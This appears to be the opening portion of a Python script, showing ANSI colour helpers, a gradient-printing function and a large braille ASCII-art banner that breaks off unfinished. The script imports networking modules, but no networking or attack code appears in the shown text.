#!/usr/bin/env python3
# Author: QUÂN | SENT BY: NAKANO MIKU
import socks
import socket
import threading
import time
import os
import random
import sys
import struct
from datetime import datetime

class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    
    @staticmethod
    def rgb(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"
    
    @staticmethod
    def bg_rgb(r, g, b):
        return f"\033[48;2;{r};{g};{b}m"

GRADIENT = [
    (124, 58, 237),   
    (168, 85, 247),   
    (236, 72, 153),   
    (34, 211, 238),   
    (96, 165, 250),   
    (139, 92, 246),   
]

def lerp(a, b, t):
    return int(a + (b - a) * t)

def get_gradient_color(t, colors=GRADIENT):
    n = len(colors) - 1
    pos = t * n
    i = int(pos)
    
    if i >= n:
        return colors[-1]
    
    t2 = pos - i
    r1, g1, b1 = colors[i]
    r2, g2, b2 = colors[i + 1]
    
    return (
        lerp(r1, r2, t2),
        lerp(g1, g2, t2),
        lerp(b1, b2, t2)
    )

def print_gradient(text, start_t=0, end_t=1):
    lines = text.split('\n')
    for line_idx, line in enumerate(lines):
        if not line.strip():
            print()
            continue
        
        chars = list(line)
        for char_idx, char in enumerate(chars):
            t = start_t + (char_idx / max(len(chars) - 1, 1)) * (end_t - start_t)
            r, g, b = get_gradient_color(t)
            print(f"{Colors.rgb(r, g, b)}{char}", end='')
        print(Colors.RESET)

ASCII_ART = r"""⣿⣿⣿⣿⣿⣿⣿⣇⠇⣧⣧⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣧⠇⠇⣧⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠇⣧⣿⣿⣿⣧⣧⣧⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣧⣧⣿⣿⣷⣿⣿⣿⣧⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣷⣧⣿⣿⣿⣿⣿⣿⣷⣧⣧⣧⣿⣿⣿⣿⣿⣿⣿⣿⣧⣧⣷⣿⣿⣿⣿⣿
⣧⣷⣷⣷⣧⣧⣧⠇⠇⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⠇⠇⣧⣧⣧⣧⣷⣷⣷⣷⣷⣷⣷⣷⠇⣇⣧⣷⣷⣧⣧⣧⣧⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣧⣧⣿⣿⣷⣷⣿⣿⣷⣧⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣧⣷⣿⣿⣿⣿⣿⣿⣷⣧⣧⣧⣷⣿⣿⣿⣿⣿⣿⣿⣷⣧⣷⣿⣿⣿⣿⣿
⣇⣇⣇⣇⣇⣧⣇⠄⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠆⠆⣇⣇⣇⣇⣇⣇⣇⣇⣧⣧⣧⣇⠆⣇⣧⣇⣇⣧⣧⣇⣧⣧⣧⣧⣧⣷⣷⣧⣷⣷⣷⣿⣿⣷⣧⣇⣿⣿⣿⣧⣷⣿⣿⣧⣧⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣧⣷⣿⣿⣿⣿⣿⣿⣷⣧⣧⣧⣷⣿⣿⣿⣿⣿⣿⣿⣷⣧⣷⣿⣿⣿⣿⣿
⣇⣇⣇⣇⣇⣇⣇⠄⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠆⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠆⠇⣧⣇⣇⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣇⣇⣧⣧⣧⣧⣧⣇⣇⣿⣿⣿⣿⣇⣧⣧⣧⣇⣧⣧⣧⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣷⣷⣿⣿⣷⣧⣷⣿⣿⣿⣿⣿⣿⣧⣇⣧⣧⣷⣿⣿⣿⣿⣿⣿⣿⣷⣧⣷⣷⣿⣿⣿⣿
⣇⣇⣇⣇⣇⣇⠇ ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠆⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣇⠄⣇⣇⣇⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣇⣇⣧⣧⣇⣇⣇⣇⣇⣿⣿⣿⣿⣷⣇⣇⣧⣇⣇⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣇⣧⣧⣷⣷⣷⣿⣿⣷⣧⣧⣇⣧⣧⣿⣿⣿⣿⣿⣿⣿⣿⣧⣷⣷⣿⣿⣿⣿
⣇⣇⣇⣇⣇⣇⠇⠄⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠆⠇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣧⠇⠇⣧⣇⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣇⣧⣧⣧⣧⣧⣇⣇⣿⣿⣿⣿⣿⣧⣧⣧⣧⣇⣧⣧⣧⣧⣧⣇⣇⣇⣧⣧⣧⣇⣇⣇⣧⣧⣧⣇⣇⣧⣧⣧⣇⣇⣧⣧⣇⣿⣿⣇⣧⣧⣷⣿⣿⣿⣿⣿⣿⣿⣧⣧⣷⣿⣿⣿⣿
⣇⣇⣇⣇⣇⣇⠆⠄⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠆⠇⣇⣇⣇⣇⣇⣇⣇⣧⣧⣇⠆⣇⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣇⣷⣿⣿⣿⣿⣿⣧⣧⣧⣇⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣇⣇⣧⣇⣇⣇⣇⣇⣇⣇⣿⣿⣧⣇⣇⣧⣧⣧⣧⣷⣷⣷⣧⣧⣧⣧⣿⣿⣿⣿
⣇⣇⣇⣇⣇⣇⠆⠄⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠆⠇⣇⣇⣇⣇⣇⣇⣧⣧⣧⣇⠇⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣷⣷⣧⣧⣧⣧⣧⣧⣧⣧⣷⣿⣿⣿⣿⣿⣷⣧⣧⣧⣇⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣇⣧⣧⣧⣇⣇⣧⣇⣇⣷⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣧⣇⣇⣇⣧⣧⣷⣿⣿⣿
⣇⣇⣇⣇⣇⣇⠄⠄⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠆⠇⣇⣇⣇⣇⣇⣧⣧⣧⣧⠇⣇⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧⣷⣷⣷⣷⣧⣧⣧⣿⣿⣿⣿⣿⣿⣷⣷⣷⣧⣧⣷⣷⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣇⣧⣧⣧⣧⣇⣧⣧⣧⣇⣿⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣧⣧
⣇⣇⣇⣇⣇⣇⠄⠄⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⠇⣧⣇⣇⣇⣧⣧⣧⣧⣇⣇⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣧⣇⣧⣧⣧⣷⣿⣿⣿⣿⣧⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇
⣇⣇⣇⣇⣇⣇⠄⠆⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⠇⣧⣇⣇⣧⣧⣧⣧⣧⣇⣇⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧⣷⣷⣷⣷⣧⣧⣧⣧⣧⣿⣿⣿⣿⣿⣷⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇
⣇⣇⣇⣇⣇⣇⠄⠆⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⠇⣇⣇⣧⣧⣧⣧⣧⣧⣇⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧⣷⣷⣧⣷⣿⣿⣿⣿⣿⣿⣇⣧⣧⣧⣧⣧⣧⣧⣇⣧⣇⣇⣇⣇⣇⣇
⣇⣇⣇⣇⣇⣇⠄⠆⠄⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⠇⣇⣇⣧⣧⣧⣧⣧⣇⣇⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧⣷⣷⣷⣷⣧⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣧⣧⣧⣧⣧⣧⣧⣧⣇⣧⣧⣧⣇⣇⣇⣇
⣇⣇⣇⠇⠇⣇⠆⠆⠄⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⠇⣇⣇⣧⣧⣧⣧⣧⣇⣇⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣧⣧⣧⣧⣧⣧⣧⣧⣇⣧⣧⣧⣧⣧⣧⣇
⣇⣇⣇⠇⠆⣇⠆⠆⠄⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⠇⣧⣇⣧⣧⣧⣧⣧⣇⣧⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣷⣷⣷⣧⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣧⣧⣧⣧⣧⣧⣧⣧⣧
⣇⣇⣇⠇⠄⣇⠆⠄⠄⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣧⣇⣧⣧⣧⣧⣧⣇⣧⣷⣷⣷⣷⣷⣷⣷⣷⣿⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣷⣧⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣧⣷⣷⣧⣧⣧⣧⣧⣧
⣇⣇⣇⠇⠄⠇⠇⠄⣇⣿⣷⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣧⣇⣧⣧⣧⣧⣇⣇⣷⣷⣷⣷⣷⣷⣧  ⣷⣿⣿⣿⣷⣇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣷⣇⣷⣷⣿⣿⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣧⣷⣷⣷⣷⣧⣧⣧⣧
⣇⣇⣇⠇⠄⠆⠇⣇⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣇⣧⣧⣧⣧⣧⣇⣇⣷⣷⣷⣷⣷⣿⠇ ⣧⣿⣿⣿⣧⠇⠇⠇⣇⣧⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣇⣷⣷⣿⣿⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣧⣷⣷⣷⣷⣧⣧⣧⣧
⣇⣇⣇⠇⠄⠄⣇⣿⣿⣿⣷⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣇⣇⣧⣧⣧⣧⠇⣧⣷⣷⣷⣷⠇⠆⣇⣿⣷⣿⣷⠆⣷⣿⣿⣷⣇⣇⣇⣧⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣧⣧⣷⣿⣿⣿⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧
⣇⣇⣇⠇⠄⠆⣿⣿⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣧⣧⣧⣧⣧⣧⣇⣧⣷⣷⣧   ⣷⣷⣷⣧⠄⠄ ⠄⣿⣿⣿⣿⣧⣇⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣧⣧⣷⣷⣿⣿⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣧⣷⣷⣷⣷⣷⣷⣷⣧⣧
⣇⣇⣇⣇⠄⣷⣿⣿⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣇⣧⣧⣧⣧⣇⣇⣧⣧⠇  ⠄⣷⣷⣷⣧⣇⣇⣷⣷⣧⣿⣿⣿⣿⣿⣿⣷⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧⣧⣷⣷⣿⣿⣿⣷⣿⠇⠆⠄        ⣇⣿⣷⣷⣷⣷⣷⣧⣷⣷⣷⣷⣷⣷⣷⣧⣧
⣇⣇⣇⣇⠄⣿⣿⣿⣿⣿⣿⣧⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣇⣇⣇⣧⣧⣇⣇⣷⣿  ⠇⣷⣷⣷⣇⠇⣇⣧⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧⣷⣿⣷⣿⣿⣿⣷⣿⣷ ⠆⣇⣧⣷⣷⣿⣷⣇    ⠆⣿⣷⣷⣷⣧⣷⣷⣷⣷⣷⣷⣷⣧⣧
⣇⣇⣇⣇⠆⣿⣿⣿⣿⣿⣿⣷⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣇⣇⣇⣇⣇⠇⣿⣿⣿⠄⣧⣷⣧⠇⣇⠄  ⣧⣷⣷⣿⣷ ⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧⣷⣷⣷⣿⣿⣿⣧⣿⣷        ⣷⣿⣿⣿⣧ ⠄⣿⣷⣷⣧⣷⣷⣷⣷⣷⣷⣷⣧⣧⣧
⣇⣇⣇⣇⠇⣿⣿⣿⣿⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣿⣿⣿⣷⣿⠇⠇⣧⣿⣿⣿⣿⣷⣷⣷⣿⠇⠇⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣷⣷      ⠄⠇⣇⠄ ⣿⣿⣿⣿⣿⣷⣷⣷⣧⣷⣷⣷⣷⣷⣷⣷⣧⣧⣧
⣇⣇⣇⣇⠆⣿⣿⣿⣿⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⠆⣷⣿⣿⣿⣿⣿⣿⣷⣷⠇⠆⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⠆  ⠄⠆⠇⣧⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣧⣷⣷⣷⣷⣷⣷⣧⣧⣧⣧
⣇⣇⣇⣇⠆⣿⣿⣿⣿⣿⣿⣿⣧⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣷⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣷⣇⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣷⠇⠄⠆⠆⠇⠆ ⠄⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣧⣷⣷⣷⣷⣷⣧⣧⣧⣧⣧
⣇⣇⣇⣇⠇⣧⣿⣿⣿⣿⣿⣿⣷⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣧⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣷⣿⠇⠇⠆⠆⠇⠄  ⣧⣷⣷⣷⣿ ⣿⣿⣿⣿⣷⣷⣧⣷⣷⣷⣷⣷⣷⣧⣧⣧⣧⣧
⣇⣇⣇⣇⠇⠄⣿⣿⣿⣿⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⠆⣧⣿⣿⣿⣿⣷⣧⣷⣷⣇ ⣿⣿⣿⣿⣷⣷⣧⣷⣷⣷⣷⣷⣧⣧⣧⣧⣧⣧
⣇⣇⣇⣇⣇ ⣷⣿⣿⣿⣿⣿⣿⣧⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣷⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣷⣷⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣧⠇⠆⠆⣿⣿⣿⣿⣿⣷⣧⣷⣷⣷⣷⣷⣧⠇⣧⣧⣧⣧⣧
⣇⣇⣇⣇⣇⠆ ⣿⣿⣿⣿⣿⣿⣷⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣷⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣷⣿⣿⣿⣿⣿⣿⣧⣷⣧⣷⣷⣧⣧⣧⣇⣧⣧⣧⣧⣇⣇
⣇⣇⣇⣇⣇⠇  ⣿⣿⣿⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣷⣷⣿⣿⣿⣷⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣷⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣧⣧⣧⣷⣧⣷⣧⣇⣇⣧⣧⣧⣇⣇⣇
⠇⣇⣇⣇⣇⣇ ⠄ ⠆⣿⣿⣿⣿⣧⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣷⣿⣷⣿⣿⣷⣿⣷⣿⣷⣷⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣷⣧⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣧⣷⣧⣧⣇⠇⣧⣧⣧⣧⣇⣇⣇⣇
 ⣇⣇⣇⣇⣇⠄    ⣧⣿⣿⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣷⣿⣷⣷⣿⣿⣷⣿⣷⣿⣿⣷⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣧⣧⣧⣧⣷⣇⠄⣧⣇⣧⣇⣇⣇⣇⣇⣇
⠄⠆⣇⣇⣇⣇⠆     ⠄⣷⣿⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣷⣿⣷⣷⣿⣿⣷⣿⣷⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣷⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣷⣿⣿⣷⣷⣿⣿⣷⣇⣧⣧⣧⠇ ⠇⣧⣇⣇⣇⣇⣇⣇⣇⣇
⣇ ⣇⣇⣇⣇⣇    ⠄   ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣷⣷⣿⣷⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣷⣿⣿⣿⣷⣿⣿⣿⣿⣷⣿⣿⣿⣷⣿⣿⣷⣿⣿⣷⣷⣿⣿⣧⣧⣧⣧⠆ ⠄⣧⣇⣇⣇⣇⣇⣇⣇⣇⣇
⣇⠄ ⣇⣇⣇⣇⠄     ⠄ ⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣧⣷⣷⣷⣧⣷⣷⣷⣷⣧⣧⣧⣧⣧⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣧⣿⣿⣿⣿⣷⣿⣿⣿⣿⣷⣿⣿⣿⣷⣿⣷⣿⣷⣷⣷⣿⣿⣧⣧⣧⣇  ⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇
⣇⠇ ⠄⣇⣇⣇⠇        ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣿⣷⣷⣧⣷⣧⣷⣷⣷⣧⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣷⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣷⣿⣿⣿⣷⣿⣷⣿⣷⣷⣿⣷⣧⣧⣧⣧⠆ ⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇
⣇⣇⠄ ⠆⣇⣇⣇        ⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣷⣷⣷⣷⣿⣷⣷⣧⣧⣧⣷⣧⠇ ⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇
⣇⣇⠇  ⠇⣇⣇⠇        ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣷⣷⣷⣿⣷⣧⣧⣷⣿⣷⣧⠇  ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇
⣇⣇⣇⠆  ⠇⣇⣇        ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣿⣿⣿⣿⣿⣷⣿⣷⣷⣷⣷⣷⣷⣧⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣿⣷⣷⣷⣿⣿⣷⠇  ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣷
